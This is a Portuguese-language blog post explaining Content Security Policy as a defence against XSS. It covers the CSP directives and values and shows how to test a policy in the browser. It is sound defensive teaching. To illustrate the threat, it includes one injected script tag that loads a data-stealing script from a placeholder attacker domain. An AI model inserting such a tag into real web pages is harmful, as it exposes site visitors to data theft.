---
title: "Content Security Policy: uma arma eficaz contra ataques XSS"
date: "2017-02-13"
author: "rferreira"
authorEmail: "rodrigo.ferreira@caelum.com.br"
main_guide: "main_guide"
main_category: "geral"
---

## Cross-Site Scripting

Já discutimos [anteriormente](https://blog.caelum.com.br/seguranca-em-aplicacoes-web-xss/) sobre o ataque XSS (Cross-Site Scripting) e os impactos que ele pode causar.

Mesmo nos dias de hoje ele ainda é um dos principais ataques realizados contra aplicações Web, estando na lista dos [Top 10](https://www.owasp.org/index.php/Category:OWASP_Top_Ten_Project) da [OWASP](https://www.owasp.org/index.php/About_OWASP).

A regra para proteger uma aplicação contra esse tipo de ataque é bem simples:

> Não confie nos seus usuários!

Não devemos confiar cegamente nos usuários de uma aplicação, pois não há garantias de que entre eles não existam hackers maliciosos querendo roubar informações e causar prejuízos.

Isso significa que você deve **validar** as entradas feitas em sua aplicação, isto é, as informações que são digitadas e enviadas pelos usuários, e também deve fazer o **escape** das informações que for exibir como saída, isto é, fazer também um tratamento das informações quando for exibi-las nas páginas, evitando assim que algum código malicioso que tenha passado batido pela validação de entrada seja executado na saída.

O problema é que os códigos JavaScript utilizados em ataques XSS podem ser [mascarados](https://www.owasp.org/index.php/XSS_Filter_Evasion_Cheat_Sheet) de diversas maneiras distintas, algo que dificulta bastante sua detecção. Além disso, os hackers maliciosos estão sempre criando novas maneiras de realizar esse ataque, sendo que em muitos casos eles conseguem realizá-lo por conta de falhas existentes nos browsers.

Isso torna bem difícil o trabalho de se manter uma aplicação Web não vulnerável ao XSS. É necessário que a equipe de desenvolvedores dela esteja em constante alerta, sempre estudando e acompanhando as novas maneiras de se realizar esse tipo de ataque, e também testando continuamente suas aplicações, a fim de identificar possíveis brechas de segurança.

Foi justamente pensando em melhorar a segurança de sites e aplicações Web contra ataques do tipo de **injeção de conteúdo**, tais como o XSS, que a [W3C](https://www.w3.org/Consortium/) criou a especificação CSP (Content Security Policy).

Para entender melhor a motivação da especificação CSP, vamos a um exemplo.

Imagine que uma aplicação Web necessite de recursos como CSS e JavaScript, tendo em uma de suas páginas o seguinte código HTML:

\[code language="html"\] <!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <title>Exemplo CSP</title> <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"> <link rel="stylesheet" href="css/menu.css"> </head>

<body> <h1>Content Security Policy</h1>

<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script> <script src="js/painel.js"></script> </body> </html> \[/code\]

Repare no código anterior que a página possui quatro recursos, sendo que dois deles são arquivos CSS e os outros dois são arquivos JavaScript.

Por padrão, sempre que acessamos uma página HTML em um browser, ele automaticamente baixa e executa **todos** os recursos que estiverem declarados nela, pois considera que são necessários para o correto funcionamento da página.

É justamente aí que mora o perigo, pois se a aplicação estiver vulnerável ao ataque XSS, um hacker poderá injetar nela um código JavaScript malicioso que também será baixado e executado pelo browser.

Por exemplo, um hacker poderia injetar o seguinte código JavaScript malicioso na página anterior:

\[code language="html"\] <script src="http://sitedohacker.com/scriptParaRoubarDados.js"></script> \[/code\]

E com isso quando qualquer usuário entrasse nela, seu browser também baixaria e executaria esse código JavaScript.

O problema é que o browser não consegue sozinho distinguir os endereços que são seguros para baixar os recursos, dos que não são.

Seria legal se pudéssemos indicar ao browser que os endereços _maxcdn.bootstrapcdn.com_ e _code.jquery.com_ são seguros e que ele pode baixar normalmente os recursos de lá, e que o endereço _sitedohacker.com_ é perigoso, devendo ser bloqueado.

Essa é justamente a ideia da especificação Content Security Policy.

## Content Security Policy

A Content Security Policy é uma especificação focada em proteger aplicações Web contra os **efeitos** de ataques de injeção de conteúdo, sendo o XSS o principal deles.

Seu funcionamento consiste em fornecer ao browser, por meio de um header HTTP, uma [whitelist](http://searchsecurity.techtarget.com/definition/application-whitelisting) contendo os endereços que são considerados seguros pela aplicação, dos quais ele poderá baixar e executar os recursos necessitados por ela.

Para utilizar a CSP devemos alterar o código de nossa aplicação, fazendo com que o servidor devolva nas repostas HTTP o header que define as restrições de segurança.

Veja um exemplo de como esse header pode ser definido:

\[code language="html"\] Content-Security-Policy: default-src 'self'; script-src 'self' https://code.jquery.com; \[/code\]

Repare que o nome do header que define a CSP deve ser **Content-Security-Policy**. Em alguns browsers, em especial em versões mais antigas, o nome do header pode ser diferente. Por exemplo, nas versões 10 e 11 do Internet Explorer o header deve se chamar _X-Content-Security-Policy_.

Repare também que o header recebe como valor uma lista contendo as **diretivas** de segurança, que são separadas por um sinal de ponto-e-virgula(;), sendo que cada uma delas pode receber vários valores distintos, que devem ser separados pelo caractere de espaço.

Cada diretiva trata um tipo de recurso em específico, tais como imagem, CSS, JavaScript, etc., e nelas devemos informar os endereços que são considerados seguros pela aplicação.

No exemplo anterior utilizamos apenas duas delas, mas existem muitas outras que podem ser utilizadas quando fizer sentido na aplicação.

Vejamos agora algumas das principais diretivas:

**default-src**

Essa diretiva funciona como _fallback_ para algumas outras, ou seja, se alguma delas não tiver sido definida, o navegador utilizará as regras definidas nessa.

**script-src**

Essa diretiva serve para indicar ao browser a política de segurança para lidar com códigos e arquivos _JavaScript_. Nela devemos indicar os endereços de onde os arquivos JavaScript podem ser carregados e executados pelo browser.

É uma das diretivas mais importantes, visto que os ataques de XSS geralmente são efetuados com códigos JavaScript.

**style-src**

Essa diretiva serve para indicar ao browser a política de segurança para lidar com códigos e arquivos _CSS_.

**img-src**

Essa diretiva serve para indicar ao browser a política de segurança para lidar com as _imagens_ utilizadas pela aplicação.

**font-src**

Essa diretiva serve para indicar ao browser a política de segurança para lidar com as _fontes customizadas_ utilizadas pela aplicação.

**media-src**

Essa diretiva serve para indicar ao browser a política de segurança para lidar com os arquivos de _media_ (audio e vídeo) utilizados pela aplicação.

**object-src**

Essa diretiva serve para indicar ao browser a política de segurança para lidar com os _plugins_ (flash, PDF, etc.) utilizados pela aplicação.

**form-action**

Essa diretiva serve para indicar ao browser a política de segurança para lidar com as _urls_ utilizadas em _formulários HTML_. Nela devemos indicar quais os endereços que podem ser utilizadas na submissão de formulários da aplicação.

**base-uri**

Essa diretiva serve para indicar ao browser a política de segurança para lidar com a tag _base_, presente nas páginas da aplicação. Nela devemos indicar quais os endereços que podem ser utilizadas nessa tag, cujo objetivo é indicar ao browser a url raiz da aplicação.

É possível também atribuir a algumas dessas diretivas, além dos endereços, os seguintes valores:

- \*
- 'none'
- 'self'
- 'unsafe-inline'

Ao atribuir o valor _\*_ a alguma diretiva, você estará liberando o acesso a todo e qualquer endereço de carregamento de arquivos daquela diretiva. Evite usar esse valor em suas diretivas, pois certamente liberar acesso a tudo pode causar vulnerabilidades na aplicação.

Ao atribuir o valor _'none'_ a alguma diretiva, você estará bloqueando todo e qualquer endereço de carregamento de arquivos daquela diretiva, inclusive dos arquivos cujo endereço for o mesmo utilizado pela aplicação. Em outras palavras, _'none'_ significa _bloqueie tudo!_.

O valor _'unsafe-inline'_ pode ser utilizado nas diretivas _script-src_ e _style-src_, para permitir a inclusão de códigos CSS e JavaScript inline, ou seja, códigos que não estão em arquivos separados da página, mas sim declarados juntamente com o código HTML.

Um exemplo de códigos CSS e JavaScript inline:

\[code language="html"\] <!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <title>Página com códigos inline</title> <style> .elemento { /\* propriedades CSS inline... \*/ } </style> </head>

<body> <h1>Códigos CSS e JavaScript inline</h1> <script> //código JavaScript inline... </script> </body> </html> \[/code\]

O valor _'self'_ geralmente é o mais utilizado nas diretivas, pois ele indica ao browser que pode carregar os arquivos cujo endereço seja o mesmo da aplicação. Isso faz com que o browser bloqueie o carregamento de arquivos externos, algo que aumenta bastante a segurança da aplicação.

Mas nem sempre o valor _'self'_ sozinho é suficiente, pois é bem comum que as aplicações dependam de arquivos externos, como bibliotecas e frameworks, que muitas vezes estão hospedados em um endereço diferente do utilizado pela aplicação em si.

No código da página HTML mostrado anteriormente temos essa situação, pois ele faz uso das bibliotecas _jQuery_ e _Bootstrap_, que estão hospedadas em endereços externos, que são diferentes do endereço da aplicação.

Daria também para faz o download dessas bibliotecas e disponibiliza-las pela própria aplicação, evitando assim a necessidade de adicionar os endereços delas nas diretivas _style-src_ e _script-src_. O problema é que nem sempre isso é possível, pois é comum que algumas aplicações utilizem uma [CDN](https://pt.wikipedia.org/wiki/Content_Delivery_Network) (Content Delivery Network) para hospedar seus arquivos estáticos, tais como CSS, JavaScript e imagens.

## Testando a CSP

É possível realizar o teste da CSP pelo próprio browser, utilizando o _Developer Tools_. Vamos fazer um teste da CSP tendo como base o código HTML mostrado anteriormente:

\[code language="html"\] <!DOCTYPE html> <html> <head> <meta charset="UTF-8"> <title>Exemplo CSP</title> <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css"> <link rel="stylesheet" href="css/menu.css"> </head>

<body> <h1>Content Security Policy</h1>

<script src="https://code.jquery.com/jquery-3.1.1.min.js"></script> <script src="js/painel.js"></script> </body> </html> \[/code\]

E vamos considerar que no servidor o header da CSP foi definido da seguinte maneira:

\[code language="html"\] Content-Security-Policy: script-src 'self'; style-src 'self'; \[/code\]

Ou seja, estamos indicando ao browser para baixar apenas os recursos de CSS e JavaScript cujos endereços sejam o mesmo da aplicação.

Se abrirmos essa página no browser, ele deverá bloquear o carregamento das bibliotecas Bootstrap e jQuery, pois seus endereços não foram incluídos nas diretivas da CSP. É possível verificar esse bloqueio pelo Developer Tools, na aba _console_:

[![Bloqueio de recursos](https://blog.caelum.com.br/wp-content/uploads/2017/01/csp-block-1-1024x258.png)](https://blog.caelum.com.br/wp-content/uploads/2017/01/csp-block-1.png)

Repare na imagem anterior como o browser realmente fez o bloqueio dos recursos, e nos mostrou uma mensagem bem detalhada do porquê eles foram bloqueados, inclusive destacando as diretivas da CSP que não foram respeitadas.

No caso do nosso exemplo anterior, como a página precisa de recursos externos, devemos alterar o header da CSP no servidor para que ele libere o acesso a tais recursos:

\[code language="html"\] Content-Security-Policy: default-src 'self'; script-src 'self' https://code.jquery.com; style-src 'self' https://maxcdn.bootstrapcdn.com; \[/code\]

Com isso a página funcionará corretamente, tendo seus recursos sendo carregados pelo browser:

[![Recursos liberados](https://blog.caelum.com.br/wp-content/uploads/2017/01/csp-2-1024x231.png)](https://blog.caelum.com.br/wp-content/uploads/2017/01/csp-2.png)

## Conclusão

Ao utilizar a CSP, mesmo que sua aplicação esteja vulnerável ao XSS e sofra um ataque desse tipo, o browser se encarregará de protegê-la, evitando que os scripts que foram injetados sejam carregados e executados.

Essa é a principal vantagem de se utilizar a CSP, pois quem cuida de verificar as políticas de segurança e realizar o bloqueio dos recursos que não as seguirem é o próprio browser. Isso evita que esse trabalho tenha que ser feito pelos desenvolvedores da aplicação, e o browser acaba se tornando um _aliado_ da aplicação contra os ataques XSS.

Recomendo fortemente que você utilize a CSP em suas aplicações Web, pois isso vai melhorar drasticamente a segurança delas em relação aos ataques de injeção de conteúdo, tais como o XSS.

Vale lembrar também que a CSP não impede que os ataques XSS sejam realizados contra uma aplicação Web. Se sua aplicação está vulnerável ao ataque XSS, mesmo utilizando a CSP ela continuará vulnerável.

O objetivo da CSP é **bloquear o carregamento e execução dos recursos que foram injetados** na aplicação, e não impedir que tais recursos sejam injetados.

Portanto, deve-se utilizar em **conjunto** com a CSP as técnicas que evitam que uma aplicação se torne vulnerável aos ataques de injeção de conteúdo.

## Continuando os estudos

A especificação CSP não é uma novidade, sua [primeira versão](https://www.w3.org/TR/CSP1/) foi publicada no final de 2012.

Em 2015 saiu a [segunda versão](https://www.w3.org/TR/CSP2/) dela, que incluiu algumas melhorias e novas diretivas. Há também uma [terceira versão](https://www.w3.org/TR/CSP3/) dela, mas que ainda está em rascunho.

Os browsers já possuem um bom [suporte](http://caniuse.com/#search=csp) para a CSP em sua primeira versão, mas a segunda ainda não é muito bem suportada.

Você pode acompanhar os trabalhos da W3C quanto às especificações de segurança em seu repositório no GitHub: [Web Application Security Working Group repo](https://github.com/w3c/webappsec).

No curso de [Arquitetura e Design de Projetos Java](https://www.caelum.com.br/curso-arquitetura-java) temos um tópico onde tratamos de vários assuntos relacionados à segurança em aplicações.

Na Alura também temos um curso de segurança, que foca em alguns tipos de ataques e como se prevenir deles: [Segurança Web: Vulnerabilidades do seu sistema e OWASP](https://www.alura.com.br/curso-online-seguranca-web-vulnerabilidades-do-seu-sistema).

Recentemente escrevi um livro sobre segurança em aplicações Web, publicado pela editora Casa do Código, e nele falo bastante sobre os principais ataques contra aplicações Web, como verificar se suas aplicações estão vulneráveis a eles, e como protegê-las: [Segurança em aplicações Web](https://www.casadocodigo.com.br/products/livro-seguranca).

Já conhecia e utilizou a especificação Content Security Policy em seus projetos? Conte-nos como foi a experiência.
